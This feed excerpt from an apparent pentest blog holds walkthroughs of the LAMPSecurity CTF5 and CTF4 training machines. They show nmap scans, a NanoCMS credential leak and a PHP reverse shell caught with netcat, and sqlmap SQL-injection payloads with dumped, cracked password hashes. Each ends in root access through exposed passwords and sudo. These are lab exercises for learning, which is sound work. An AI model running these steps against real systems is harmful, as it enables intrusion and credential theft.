<p>Nice twist on this file upload vulnerability!</p>

<h1>Report</h1>

<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>

<ul>
<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
</ul>


<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>

<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>

<p><img class="center" src="/images/pentest/drunkadmin/think.png" title="&lsquo;think&rsquo; &lsquo;hmm&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF5]]></title>
    <link href="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/"/>
    <updated>2016-05-05T12:24:38-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5</id>
    <content type="html"><![CDATA[<p>Continuing the LAMPSecurity series, the next machine I&rsquo;m going after is CTF5.</p>

<!-- more -->


<h3>Recon</h3>

<p>Nmap scan reveals there are plenty of open ports:</p>

<p>``` plain
nmap -sS -sV -p1-65535 192.168.80.154</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-05-09 12:17 EDT
Nmap scan report for 192.168.80.154
Host is up, received arp-response (0.00024s latency).
Not shown: 65524 closed ports
Reason: 65524 resets
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7 (protocol 2.0)
25/tcp    open  smtp        syn-ack ttl 64 Sendmail 8.14.1/8.14.1
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.6 ((Fedora))
110/tcp   open  pop3        syn-ack ttl 64 ipop3d 2006k.101
111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
143/tcp   open  imap        syn-ack ttl 64 University of Washington IMAP imapd 2006k.396 (time zone: -0400)
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
901/tcp   open  http        syn-ack ttl 64 Samba SWAT administration server
3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.45
38972/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
```</p>

<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>

<h4>Web server</h4>

<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>

<p><img class="center" src="/images/pentest/ctf5/phake.png" title="&lsquo;phake home&rsquo; &lsquo;phake org&rsquo;" ></p>

<p>We can register for a mailing list:</p>

<p><img class="center" src="/images/pentest/ctf5/list.png" title="&lsquo;mail list&rsquo; &lsquo;mailing list&rsquo;" ></p>

<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>

<p>The blog page also has an admin login page and another Squirrel Mail page:</p>

<p><img class="center" src="/images/pentest/ctf5/blog.png" title="&lsquo;blog&rsquo; &lsquo;blog&rsquo;" ></p>

<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>

<p><img class="center" src="/images/pentest/ctf5/event.png" title="&lsquo;event manager&rsquo; &lsquo;event planner&rsquo;" ></p>

<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>

<h3>Exploiting the CMS</h3>

<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>

<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>

<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>

<p><code>plain
a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}
</code></p>

<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>

<p><img class="center" src="/images/pentest/ctf5/nanocms.png" title="&lsquo;nanocms admin panel&rsquo; &lsquo;admin panel&rsquo;" ></p>

<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>

<p><code>plain
nc -vvnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.155] from (UNKNOWN) [192.168.80.154] 43028
Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
 11:02:41 up  3:30,  0 users,  load average: 0.24, 0.05, 0.02
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-3.2$ whoami
apache
</code></p>

<p>Time for some enumeration! Looking in the home directory, I noticed quite a few user folders:</p>

<p><code>plain
sh-3.2$ ls
amy
andy
jennifer
loren
patrick
</code></p>

<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>

<p><code>plain
sh-3.2$ ls -al patrick
total 344
drwxrwxr-x 25 patrick patrick 4096 Dec  5  2012 .
drwxr-xr-x  7 root    root    4096 Apr 28  2009 ..
-rw-------  1 patrick patrick    0 Dec  5  2012 .ICEauthority
drwx------  2 patrick patrick 4096 Apr 28  2009 .Trash
-rw-------  1 patrick patrick  530 Dec  5  2012 .bash_history
-rw-r--r--  1 patrick patrick   33 Aug 31  2007 .bash_logout
-rw-r--r--  1 patrick patrick  176 Aug 31  2007 .bash_profile
-rw-r--r--  1 patrick patrick  124 Aug 31  2007 .bashrc
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .config
-rw-r--r--  1 patrick patrick   28 Apr 29  2009 .dmrc
drwxrwxr-x  8 patrick patrick 4096 Apr 29  2009 .evolution
drwx------  5 patrick patrick 4096 Dec  5  2012 .gconf
drwx------  2 patrick patrick 4096 Dec  5  2012 .gconfd
drwxrwxr-x  3 patrick patrick 4096 Apr 28  2009 .gnome
drwxr-xr-x  7 patrick patrick 4096 Dec  5  2012 .gnome2
drwx------  2 patrick patrick 4096 Apr 28  2009 .gnome2_private
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .gstreamer-0.10
-rw-rw-r--  1 patrick patrick  146 Dec  5  2012 .gtk-bookmarks
-rw-r--r--  1 patrick patrick   89 Apr 28  2009 .gtkrc-1.2-gnome2
drwxr-xr-x  3 patrick patrick 4096 Apr 28  2009 .local
-rw-rw-r--  1 patrick patrick   18 Apr 29  2009 .mailboxlist
drwx------  3 patrick patrick 4096 Apr 28  2009 .metacity
drwx------  3 patrick patrick 4096 Apr 28  2009 .mozilla
-rw-------  1 patrick patrick   37 Apr 29  2009 .mysql_history
drwxr-xr-x  3 patrick patrick 4096 Dec  5  2012 .nautilus
-rw-rw-r--  1 patrick patrick  773 Dec  5  2012 .recently-used.xbel
drwxrwxr-x  4 patrick patrick 4096 Dec  5  2012 .tomboy
-rw-r--r--  1 patrick patrick 5128 Dec  5  2012 .tomboy.log
drwxr-xr-x  2 patrick patrick 4096 Dec  5  2012 .wapi
-rw-r--r--  1 patrick patrick  847 Dec  5  2012 .xsession-errors
-rw-r--r--  1 patrick patrick  658 Oct 11  2007 .zshrc
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Desktop
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Documents
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Download
-rw-------  1 patrick patrick  509 Apr 29  2009 Drafts
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Music
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Pictures
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Public
-rw-------  1 patrick patrick 4329 Apr 29  2009 Sent
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Templates
-rw-------  1 patrick patrick 1243 Apr 29  2009 Trash
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Videos
-rwxrw----  1 patrick patrick    0 Apr 29  2009 test.txt
</code></p>

<p>I couldn&rsquo;t read the .mysql_history or test.txt files, but the next one I tried, the <code>.tomboy.log</code> file, was really interesting! I only show the interesting bits here:</p>

<p><code>plain
sh-3.2$ cat .tomboy.log
...
12/5/2012 7:24:34 AM [DEBUG]: Creating Buffer for 'New Note 3'...
12/5/2012 7:24:34 AM [DEBUG]: New Note 3 tags:
12/5/2012 7:24:38 AM [DEBUG]: Saving 'New Note 3'...
12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
12/5/2012 7:27:41 AM [DEBUG]: Received request for saving session
12/5/2012 7:27:41 AM [DEBUG]: Saving unsaved notes...
12/5/2012 7:27:41 AM [DEBUG]: All done.  Ciao!
</code></p>

<p>Tomboy is a note-taking application and it looks like the root password was saved in a note?! I went to the <code>.tomboy</code> directory and found some notes:</p>

<p><code>plain
sh-3.2$ ls
481bca0d-7206-45dd-a459-a72ea1131329.note
addin-db-000
addins
ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note
d2684fad-3aab-444c-b90a-4f307c0818f6.note
manifest.xml
</code></p>

<p>Found the jackpot in the first one!</p>

<p>``` plain
sh-3.2$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note
&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;utf-8&rdquo;?>
<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
  <title>Root password</title>
  <text xml:space="preserve">&lt;note-content version=&ldquo;0.1&rdquo;>Root password</p>

<p>Root password</p>

<p>50$cent&lt;/note-content></text>
&hellip;
```</p>

<p>Now all that is left is to become root! I SSH'ed with the root credentials and the machine is mine now!</p>

<h5>Concluding remarks</h5>

<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>

<p>``` plain
/ It&rsquo;s lucky you&rsquo;re going so slowly, \
| because you&rsquo;re going in the wrong  |
\ direction.                         /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF4]]></title>
    <link href="http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/"/>
    <updated>2016-04-19T05:40:39-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is part of a CTF series by the LAMPSecurity project.</p>

<!-- more -->


<p>The Nmap scan reveals just a few ports:</p>

<p>``` plain
root@pwnbox:~/Downloads#nmap -sS -sV -p1-65535 192.168.80.152</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-03-02 09:26 EST
Nmap scan report for 192.168.80.152
Host is up, received arp-response (0.00038s latency).
Not shown: 65531 filtered ports, 1 closed port
Reason: 65369 no-responses, 162 host-prohibiteds and 1 reset
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.3 (protocol 2.0)
25/tcp open  smtp    syn-ack ttl 64 Sendmail 8.13.5/8.13.5
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.0 ((Fedora))
MAC Address: 00:0C:29:1D:B6:45 (VMware)
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix
```</p>

<p>Checking out the web server, we can see this page:</p>

<p><img class="center" src="/images/pentest/ctf4/home.png" title="&lsquo;home&rsquo; &lsquo;home&rsquo;" ></p>

<p>Let&rsquo;s get digging!</p>

<h3>Recon</h3>

<p>The Blog section contains some blog posts, for which the URL looks like this: <code><a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5</a></code>. That id parameter calls for SQLi testing and the page parameter could be vulnerable to LFI. But for now, let&rsquo;s keep sniffing around.</p>

<p>One of the things I always do when doing web based challenges is check if there&rsquo;s anything of interest in the <code>robots.txt</code> file. So I did it here as well and I wasn&rsquo;t disappointed:</p>

<p><code>plain
User-agent: *
Disallow: /mail/
Disallow: /restricted/
Disallow: /conf/
Disallow: /sql/
Disallow: /admin/
</code></p>

<p>Quite a few places to check! Let&rsquo;s see what we&rsquo;ve got.</p>

<ul>
<li><strong>/mail/</strong></li>
</ul>


<p>This is not your regular mail server:</p>

<p><img class="center" src="/images/pentest/ctf4/squirrel.png" title="&lsquo;squirrelmail&rsquo; &lsquo;squirrelmail&rsquo;" ></p>

<p>I&rsquo;ve never seen this before, so I checked the project&rsquo;s homepage:</p>

<blockquote><p>SquirrelMail is a standards-based webmail package written in PHP. It includes built-in pure PHP support for the IMAP and SMTP protocols, and
all pages render in pure HTML 4.0 (with no JavaScript required) for maximum compatibility across browsers. It has very few requirements and is
very easy to configure and install. SquirrelMail has all the functionality you would want from an email client, including strong MIME support,
address books, and folder manipulation.</p></blockquote>

<p>Ok, will come back to this, for now I&rsquo;m just checking the entire thing for possible entry points.</p>

<ul>
<li><strong>/restricted/</strong></li>
</ul>


<p>Trying to get to this folder will pop up a basic authentication window. Moving on</p>

<ul>
<li><strong>/conf/</strong></li>
</ul>


<p>This one gives an internal server error, but discloses the e-mail address of the server administrator: <code>dstevens@localhost</code></p>

<ul>
<li><strong>/sql/</strong></li>
</ul>


<p>Here we have a directory indexing with a db.sql file that contains the following:</p>

<p><code>sql
use ehks;
create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);
create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);
create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);
</code></p>

<ul>
<li><strong>/admin/</strong></li>
</ul>


<p>And finally, an admin login page.</p>

<p><img class="center" src="/images/pentest/ctf4/admin.png" title="&lsquo;admin&rsquo; &lsquo;admin&rsquo;" ></p>

<p>Also, the search functionality is vulnerable to XSS! Ok, we have enough information to start poking deeper.</p>

<h3>Getting in</h3>

<p>First thing I tried was to put a quote in the id parameter, and a SQL error popped up:  <em>Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20</em>. Time to fire Sqlmap!</p>

<p>First, I enumerated the available databases:</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=2">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=2</a>&rdquo; -p &ldquo;id&rdquo; &mdash;dbms=MySQL &mdash;dbs</p>

<p>[06:05:45] [INFO] testing connection to the target URL</p>

<h2>sqlmap resumed the following injection point(s) from stored session:</h2>

<p>Parameter: id (GET)</p>

<pre><code>Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: page=blog&amp;title=Blog&amp;id=2 AND 4151=4151

Type: AND/OR time-based blind
Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
Payload: page=blog&amp;title=Blog&amp;id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))tueL)

Type: UNION query
Title: Generic UNION query (NULL) - 5 columns
Payload: page=blog&amp;title=Blog&amp;id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7671,0x61536d554d5745557253,0x7162716a71),NULL,NULL-- 
</code></pre>

<hr />

<p>[06:05:45] [INFO] testing MySQL
[06:05:45] [INFO] confirming MySQL
[06:05:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 5 (Bordeaux)
web application technology: Apache 2.2.0, PHP 5.1.2
back-end DBMS: MySQL >= 5.0.0
[06:05:45] [INFO] fetching database names
available databases [6]:
[<em>] calendar
[</em>] ehks
[<em>] information_schema
[</em>] mysql
[<em>] roundcubemail
[</em>] test
```</p>

<p>I then looked at the ehks database, the interesting table contains usernames and password hashes:</p>

<p><code>plain
Database: ehks
Table: user
[6 entries]
+---------+-----------+----------------------------------+
| user_id | user_name | user_pass                        |
+---------+-----------+----------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
+---------+-----------+----------------------------------+
</code></p>

<p>I cracked the MD5 hashes with an online tool, behold the passwords!</p>

<p><code>plain
dstevens: ilike2surf
achen: seventysixers
pmoore: Homesite
jdurbin: Sue1978
sorzek: pacman
ghighland: undone1
</code></p>

<p>With dstevens' credentials I was able to log in both to the mail and admin panel. The admin functionality allows you to create another blog page, which I tested and it works. The mailbox was more interesting, because it was filled with OSSEC HIDS logs of my attacks! Will delete them before I&rsquo;m done, but for now I scrolled all the way to the bottom to find some real mail:</p>

<p>``` plain
I&rsquo;m installing OSSEC v2 on the server &ndash; so I also had to install gcc and
binutils.  Just wanted to let you know.</p>

<p>&mdash;
Andrew Chen
Unix Administrator
Ehks Data Research Center
```</p>

<p>I&rsquo;m thinking this mail is not just for occupying storage, but it&rsquo;s hinting that we&rsquo;ll have to do some binary exploitation on the target..Anyway, there is more mail about the server setup:</p>

<p>``` plain
Hello all,</p>

<p>  the server is up and running now and should be able to support most of
our needs.  Don and I are still working on installing a few more patches
and configuring things.  Let us know if you have any problems.  Thanks!</p>

<p>&mdash;
Don Stevens
Sr. Unix Admin
Prof. Ehks Data Research Center
```</p>

<p>``` plain</p>

<p>Hey Don,</p>

<p>  I think I got the server pretty much set up.  I just have to make some
more adjustments.  Unfortunately I couldn&rsquo;t get RoundCube installed
because our version of PHP is too low.  I&rsquo;ll send more updates as I make
them.</p>

<p>&mdash;
James Durbin
Webmaster
Prof. Ehks Data Research Center
```</p>

<p>There is also mail about a calendar feature that I wasn&rsquo;t aware of:</p>

<p>``` plain
Hello all,</p>

<p>  I&rsquo;d like to announce that the new calendaring software is online.  You
all have accounts that you can log in with, they have the same username
and password as your machine accounts.  Feel free to log into the new
system at <a href="http://192.168.0.6/calendar.">http://192.168.0.6/calendar.</a>  Let me know if you have any
problems.</p>

<p>&mdash;
Don Stevens
```</p>

<p>I&rsquo;ve almost forgotten to check the <em>/restricted</em> folder, so I next did that. It worked with the pair of <em>pmoore/Homesite</em>. Inside there are 2 text files:</p>

<p>``` plain
blog_instructions.txt</p>

<h1>Instructions for Posting to the Blog</h1>

<p>Just log into the admin section at <a href="http://192.168.0.6/admin.">http://192.168.0.6/admin.</a>
Use your regular machine credentials (username and password).
Once you&rsquo;re logged in click the &ldquo;Blog&rdquo; link.</p>

<p>webmail_instructions.txt</p>

<h1>Instructions for Webmail</h1>

<p>Browse to the URL <a href="http://192.168.0.6/mail">http://192.168.0.6/mail</a>
Log in with your regular machine credentials (username and password).
Use webmail ;)</p>

<p>Let Don or James know if you&rsquo;re having problems.
```</p>

<p>Just stuff we had figured on our own. I checked the PHP version, because of the mail hint, the headers mention it as being 5.1.2. Next I logged in for the calendar:</p>

<p><img class="center" src="/images/pentest/ctf4/calendar.png" title="&lsquo;calendar&rsquo; &lsquo;calendar&rsquo;" ></p>

<p>In the admin tab we can modify some calendar options and add a new user. Nothing too helpful in hacking the target, although I did try a RFI because a Nessus scan I&rsquo;ve run indicated the calendar was vulnerable to <a href="http://www.gulftech.org/advisories/PHP-Calendar%20Arbitrary%20File%20Inclusion/58">arbitrary file inclusion</a>. So the last thing left to try before thinking of more options was to see if I could login to SSH with any of the usernames and passwords I had. And I was able to get in the box from the first try, as dstevens!</p>

<p>I looked around in his home directory, the files related to the site are hosted there. Then I tried to read the <code>/etc/sudoers</code> file, and it worked with sudo and his password:</p>

<p>``` plain
&hellip;</p>

<h1>User privilege specification</h1>

<p>root    ALL=(ALL) ALL
dstevens    ALL=(ALL)   ALL
achen   ALL=(ALL)   NOPASSWD:ALL
&hellip;
```</p>

<p>Well, look at these privileges! Then it&rsquo;s all the matter of becoming root with a simple <em>su</em>:</p>

<p><code>plain
[dstevens@ctf4 calendar]$ sudo su -
Password:
[root@ctf4 ~]# whoami
root
</code></p>

<p>Game over! Although at the beginning there seemed to be multiple web avenues for exploitation, most of them were informational, and it was just the SQL injection that gave the keys to the kingdom. Lax permissions and password reuse facilitated the compromise of the target.</p>

<p>``` plain
/ Q: How do you shoot a blue elephant? A: \
| With a blue-elephant gun.               |
|                                         |
| Q: How do you shoot a pink elephant? A: |
| Twist its trunk until it turns blue,    |
| then shoot it with                      |
|                                         |
\ a blue-elephant gun.                    /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
